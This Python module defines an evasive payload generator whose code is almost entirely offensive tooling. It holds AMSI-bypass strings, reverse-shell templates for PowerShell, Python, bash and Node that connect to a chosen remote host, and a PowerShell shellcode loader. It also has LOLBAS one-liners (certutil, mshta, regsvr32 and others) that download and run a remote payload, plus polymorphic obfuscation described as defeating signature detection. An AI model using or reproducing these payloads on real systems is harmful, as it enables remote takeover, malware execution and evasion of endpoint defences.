"""Advanced evasive payload generation with multiple obfuscation strategies.

Provides polymorphic payload generation that mutates on each invocation,
making signature-based detection ineffective. Supports PowerShell
AMSI bypass, JavaScript obfuscation, shellcode encoding chains,
process injection variants, and LOLBAS execution paths.
"""

from __future__ import annotations

import base64
import random
import string
import uuid
import zlib
from typing import Any


class EvasivePayloadGenerator:
    """Generates detection-evading payloads with configurable obfuscation layers."""

    AMSI_BYPASS_TEMPLATES = [
        '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)',
        '$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields("NonPublic,Static");Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)',
        '$x=[Ref].Assembly.GetType("System.Management.Automation.Am"+"siUtils");$y=$x.GetField("am"+"siInitFailed","NonPublic,Static");$y.SetValue($null,$true)',
        '&( $SHELLiD[1]+$SHELlID[13]+"x") (NeW-oBJeCT io.COMpReSsIoN.dEFlAtestrEaM( [iO.meMOrYstREAM] [cOnveRT]::frOmBase64STRiNg( "rVHBioMwFPwAYyBXL1LwIpRSEQ9FhL2IlfoJwTyzwTQxiXH791VotxV6KAzMG2bezFBwBQHw2TjEOrxm7DxqVYk4dA8Fs9R31o3oU7jRFt3Ye2o+Bp++YlPeTaViXc2sMQuVdYni5I+W9LOi06Jdpo0op1NPa/9H9pEir+c0LlOAcDuf/zDIO0fy6wa7SqBVmjyRr6dDm6rN4nI8/gA=" ) , [SYsTEm.iO.compReSsioN.COmPreSsiONmoDE]::DeCOMPreSs )|%{ & $EnV:CmD /c ASSEMbLY ( ( $PSHOME[1]+$pShOMe[29]+"x")( $_ ) ) }; # AMSI bypass via compressed assembly load',
    ]

    SYSLIB_BYPASS_TEMPLATES = [
        'function Get-ProcAddress {Param($m,$p);$a=@();$u=[AppDomain]::CurrentDomain.GetAssemblies();($u |? {$_.GlobalAssemblyCache -And $_.Location.Split("\\\\")[-1].Equals("System.dll")}).GetType("Microsoft.Win32.UnsafeNativeMethods").GetMethod("GetProcAddress").Invoke($null,@([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr),($u |? {$_.GlobalAssemblyCache -And $_.Location.Split("\\\\")[-1].Equals("System.dll")}).GetType("Microsoft.Win32.UnsafeNativeMethods").GetMethod("GetModuleHandle").Invoke($null,@($m)))),$p))}function Get-DelegateType{[OutputType([Type])]Param([Type[]]$p,[Type]$r=([Void])];$d=[AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName("ReflectedDelegate")),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule("InMemoryModule",$false).DefineType("MyDelegateType","Class, Public, Sealed, AnsiClass, AutoClass",[System.MulticastDelegate]);$d.DefineConstructor("RTSpecialName, HideBySig, Public",[System.Reflection.CallingConventions]::Standard,$p).SetImplementationFlags("Runtime, Managed");$d.DefineMethod("Invoke","Public, HideBySig, NewSlot, Virtual",$r,$p).SetImplementationFlags("Runtime, Managed");$d.CreateType()}',
    ]

    REVERSE_SHELL_TEMPLATES: dict[str, str] = {
        "powershell": (
            "$c=New-Object System.Net.Sockets.TCPClient('{rhost}',{rport});"
            "$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
            "$e=New-Object System.Text.ASCIIEncoding;"
            "while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
            "$d=$e.GetString($b,0,$i);"
            "$r=(iex $d 2>&1|Out-String);"
            "$x=$e.GetBytes($r+''PS ''+(Get-Location).Path+''> '');"
            "$s.Write($x,0,$x.Length);$s.Flush()}};$c.Close()"
        ),
        "python": (
            "import socket,subprocess,os\n"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
            "s.connect(('{rhost}',{rport}))\n"
            "os.dup2(s.fileno(),0)\n"
            "os.dup2(s.fileno(),1)\n"
            "os.dup2(s.fileno(),2)\n"
            "subprocess.call(['/bin/sh','-i'])"
        ),
        "bash": (
            "bash -i >& /dev/tcp/{rhost}/{rport} 0>&1"
        ),
        "node": (
            "(function(){{"
            "var n=require('net'),s=require('child_process').spawn('sh');"
            "var c=new n.Socket();c.connect({rport},'{rhost}',function(){{"
            "c.pipe(s.stdin);s.stdout.pipe(c);s.stderr.pipe(c);}});"
            "return /a/;}})();"
        ),
    }

    ENCODING_CHAINS = [
        ["base64"],
        ["base64", "gzip"],
        ["xor", "base64"],
        ["base64", "xor", "base64"],
        ["gzip", "base64", "rot13"],
        ["xor", "gzip", "base64"],
    ]

    EVASION_TECHNIQUES = [
        "sleep_obfuscation",
        "syscall_direct",
        "unhooking",
        "indirect_syscall",
        "api_hashing",
        "process_hollowing",
        "early_bird_apc",
        "thread_hijacking",
        "module_stomping",
        "phantom_dll_hollowing",
    ]

    def __init__(self) -> None:
        self._xor_key = random.randint(1, 255)

    def _random_var(self, length: int = 8) -> str:
        """Generate a random valid variable name."""
        first = random.choice(string.ascii_letters + "_")
        rest = "".join(random.choices(string.ascii_letters + string.digits + "_", k=length - 1))
        return first + rest

    def _random_string(self, length: int = 16) -> str:
        """Generate a random ASCII string for junk data."""
        return "".join(random.choices(string.ascii_letters + string.digits, k=length))

    def _xor_encode(self, data: bytes, key: int | None = None) -> bytes:
        """XOR encode bytes with a single-byte key."""
        k = key if key is not None else random.randint(1, 255)
        return bytes(b ^ k for b in data)

    def _rot13(self, data: str) -> str:
        """Apply ROT13 substitution cipher."""
        result = []
        for c in data:
            if "a" <= c <= "z":
                result.append(chr((ord(c) - ord("a") + 13) % 26 + ord("a")))
            elif "A" <= c <= "Z":
                result.append(chr((ord(c) - ord("A") + 13) % 26 + ord("A")))
            else:
                result.append(c)
        return "".join(result)

    def _gzip_compress(self, data: bytes) -> bytes:
        """Compress data using zlib with gzip header."""
        return zlib.compress(data, level=9)

    def _apply_encoding_chain(self, data: bytes, chain: list[str]) -> tuple[bytes, dict[str, Any]]:
        """Apply a chain of encoding transformations.

        Returns the final encoded bytes and metadata for decoder generation.
        """
        metadata: dict[str, Any] = {"chain": chain, "xor_key": None}
        current: bytes = data
        for step in chain:
            if step == "base64":
                current = base64.b64encode(current)
            elif step == "gzip":
                current = self._gzip_compress(current)
            elif step == "xor":
                key = random.randint(1, 255)
                metadata["xor_key"] = key
                current = self._xor_encode(current, key)
            elif step == "rot13":
                current = self._rot13(current.decode(errors="replace")).encode()
        return current, metadata

    def generate_powershell_obfuscated(
        self,
        payload: str,
        obfuscation_level: int = 3,
    ) -> str:
        """Generate an obfuscated PowerShell payload.

        Args:
            payload: The raw PowerShell command to obfuscate.
            obfuscation_level: 1=minimal, 2=moderate, 3=heavy.

        Returns:
            A heavily obfuscated PowerShell one-liner.
        """
        if obfuscation_level >= 2:
            payload_b64 = base64.b64encode(payload.encode("utf-16le")).decode()
        else:
            payload_b64 = base64.b64encode(payload.encode()).decode()

        if obfuscation_level >= 3:
            amsi_bypass = random.choice(self.AMSI_BYPASS_TEMPLATES)
            prefix = f"{amsi_bypass};"
        else:
            prefix = ""

        if obfuscation_level >= 2:
            chunk_size = random.randint(20, 60)
            chunks = [payload_b64[i:i + chunk_size] for i in range(0, len(payload_b64), chunk_size)]
            chunk_vars = [self._random_var(6) for _ in chunks]
            chunk_assignments = ";".join(
                f"${v}='{c}'" for v, c in zip(chunk_vars, chunks)
            )
            combined = "+".join(f"${v}" for v in chunk_vars)
            decoder = (
                f"$d=[System.Text.Encoding]::Unicode.GetString("
                f"[System.Convert]::FromBase64String({combined}));"
                f"iex $d"
            )
            return f"{prefix}{chunk_assignments};{decoder}"

        return f"{prefix}iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{payload_b64}')))"

    def generate_javascript_obfuscated(self, payload: str) -> str:
        """Generate an obfuscated JavaScript payload.

        Args:
            payload: Raw JavaScript to obfuscate.

        Returns:
            Obfuscated JavaScript using eval with char code reconstruction.
        """
        encoded = ",".join(str(ord(c)) for c in payload)
        var_names = [self._random_var(6) for _ in range(3)]
        return (
            f"var {var_names[0]}=[{encoded}];"
            f"var {var_names[1]}='';"
            f"for(var {var_names[2]}=0;{var_names[2]}<{var_names[0]}.length;{var_names[2]}++){{"
            f"{var_names[1]}+=String.fromCharCode({var_names[0]}[{var_names[2]}]);}}"
            f"eval({var_names[1]});"
        )

    def generate_vba_obfuscated(self, payload: str) -> str:
        """Generate an obfuscated VBA macro payload.

        Args:
            payload: Raw VBA code to obfuscate.

        Returns:
            Obfuscated VBA using Chr() function reconstruction.
        """
        result = "Dim " + self._random_var(6) + " As String\n"
        result += self._random_var(6) + " = "
        parts = []
        for c in payload:
            parts.append(f"Chr({ord(c)})")
        result += " & ".join(parts) + "\n"
        return result

    def generate_linux_evasive(
        self,
        rhost: str,
        rport: int,
        technique: str = "python",
    ) -> str:
        """Generate an evasive Linux reverse shell payload.

        Args:
            rhost: Remote host IP.
            rport: Remote port.
            technique: Shell type (python, bash, or node).

        Returns:
            Base64-encoded evasive payload ready for execution.
        """
        template = self.REVERSE_SHELL_TEMPLATES.get(technique, self.REVERSE_SHELL_TEMPLATES["python"])
        raw = template.format(rhost=rhost, rport=rport)
        payload_bytes = raw.encode()
        encoded, _ = self._apply_encoding_chain(
            payload_bytes,
            random.choice(self.ENCODING_CHAINS),
        )
        return base64.b64encode(encoded).decode()

    def generate_shellcode_loader_powershell(
        self,
        shellcode_b64: str,
        injection_technique: str = "early_bird_apc",
    ) -> str:
        """Generate a PowerShell shellcode loader with AMSI bypass.

        Args:
            shellcode_b64: Base64-encoded shellcode.
            injection_technique: Process injection technique to embed.

        Returns:
            Complete obfuscated PowerShell loader.
        """
        amsi = random.choice(self.AMSI_BYPASS_TEMPLATES)
        var_k = self._random_var(6)
        var_f = self._random_var(6)
        var_a = self._random_var(6)
        var_p = self._random_var(6)
        var_t = self._random_var(6)

        if injection_technique == "early_bird_apc":
            inject_code = (
                f"${var_a}=Add-Type -memberDefinition '[DllImport(\"kernel32\")]"
                f"public static extern IntPtr VirtualAlloc(IntPtr l,int s,uint t,uint p);"
                f"[DllImport(\"kernel32\")]public static extern IntPtr CreateThread(IntPtr a,int z,IntPtr s,IntPtr p,uint f,IntPtr t);' "
                f'-name \"{self._random_string(6)}\" -pasThru;'
                f"${var_k}={shellcode_b64};"
                f"${var_t}=[System.Convert]::FromBase64String(${var_k});"
                f"${var_p}=${var_a}::VirtualAlloc(0,${var_t}.Length,0x3000,0x40);"
                f"[System.Runtime.InteropServices.Marshal]::Copy(${var_t},0,${var_p},${var_t}.Length);"
                f"${var_f}=${var_a}::CreateThread(0,0,${var_p},0,0,0);"
            )
        else:
            inject_code = (
                f"${var_k}={shellcode_b64};"
                f"${var_t}=[System.Convert]::FromBase64String(${var_k});"
                f"${var_p}=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(${var_t}.Length);"
                f"[System.Runtime.InteropServices.Marshal]::Copy(${var_t},0,${var_p},${var_t}.Length);"
                f"${var_f}=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${var_p},[Func[IntPtr]]);"
                f"${var_f}.Invoke();"
            )

        return f"{amsi};{inject_code}"

    def generate_lolbas_execution(
        self,
        payload_url: str,
        technique: str = "mshta",
    ) -> tuple[str, str]:
        """Generate a LOLBAS-based payload execution command.

        Uses legitimate Windows binaries for execution to bypass
        application allowlisting.

        Args:
            payload_url: URL hosting the payload.
            technique: LOLBAS binary to use.

        Returns:
            Tuple of (command, description).
        """
        techniques: dict[str, tuple[str, str]] = {
            "mshta": (
                f"mshta.exe javascript:a=GetObject('script:{payload_url}').Exec();close();",
                "MSHTA — executes remote HTA/JS payloads via the Microsoft HTML Application host",
            ),
            "certutil": (
                f"certutil.exe -urlcache -split -f {payload_url} %TEMP%\\{self._random_string(8)}.exe && %TEMP%\\{self._random_string(8)}.exe",
                "Certutil — downloads and executes payload via certificate utility",
            ),
            "bitsadmin": (
                f"bitsadmin.exe /transfer {self._random_string(6)} /download /priority high {payload_url} %TEMP%\\{self._random_string(8)}.exe && %TEMP%\\{self._random_string(8)}.exe",
                "Bitsadmin — BITS job-based download with delayed execution",
            ),
            "regsvr32": (
                f"regsvr32.exe /s /n /u /i:{payload_url} scrobj.dll",
                "Regsvr32 — executes remote SCT payload via COM scriptlet registration",
            ),
            "rundll32": (
                f"rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();(new%20ActiveXObject('WScript.Shell')).Run('{payload_url}');",
                "Rundll32 — executes JavaScript via mshtml RunHTMLApplication export",
            ),
            "wmic_xsl": (
                f'wmic.exe os get /format:"{payload_url}"',
                "WMIC XSL — executes remote XSL stylesheet with embedded script via WMIC",
            ),
            "cmstp": (
                f"cmstp.exe /s /ns {payload_url}",
                "CMSTP — connection profile installer bypass with remote INF payload",
            ),
        }
        cmd, desc = techniques.get(technique, techniques["mshta"])
        return cmd, desc

    def generate_polymorphic_command(
        self,
        base_cmd: str,
        iterations: int = 5,
    ) -> str:
        """Generate a polymorphic command that mutates at each execution.

        Inserts random no-op commands, variable renames, and padding
        to defeat signature-based detection.

        Args:
            base_cmd: The base command to obfuscate.
            iterations: Number of obfuscation passes.

        Returns:
            A polymorphic command that produces the same effect.
        """
        cmd = base_cmd
        for _ in range(iterations):
            technique = random.randint(0, 4)
            if technique == 0 and cmd.startswith("powershell"):
                junk_var = self._random_var(6)
                junk_val = self._random_string(16)
                cmd = cmd.replace("powershell", f"${junk_var}={junk_val};powershell")
            elif technique == 1 and " -" in cmd:
                parts = cmd.split(" -", 1)
                if len(parts) == 2:
                    junk_switch = self._random_string(4)
                    cmd = f"{parts[0]} -{junk_switch}:{self._random_string(8)} -{parts[1]}"
            elif technique == 2:
                junk_cmd = f"(set {self._random_var(4)}={self._random_var(4)})"
                cmd = f"{junk_cmd} && {cmd}"
            elif technique == 3:
                cmd = f"echo {self._random_string(32)} > nul && {cmd}"
            elif technique == 4:
                cmd = cmd.replace("powershell", "pOwErShElL")
                cmd = cmd.replace("-enc", "-eNc")
                cmd = cmd.replace("-nop", "-nOp")
        return cmd

    def list_techniques(self) -> dict[str, list[str]]:
        """Return all available evasion techniques."""
        return {
            "amsi_bypass": [
                "Reflection-based patching",
                "Type coercion bypass",
                "String concatenation split",
                "Compressed assembly load",
            ],
            "encoding_chains": [",".join(c) for c in self.ENCODING_CHAINS],
            "injection_techniques": self.EVASION_TECHNIQUES,
            "lolbas_binaries": [
                "mshta",
                "certutil",
                "bitsadmin",
                "regsvr32",
                "rundll32",
                "wmic_xsl",
                "cmstp",
            ],
            "script_formats": [
                "powershell_obfuscated",
                "javascript_obfuscated",
                "vba_obfuscated",
                "polymorphic_command",
            ],
        }


__all__ = ["EvasivePayloadGenerator"]
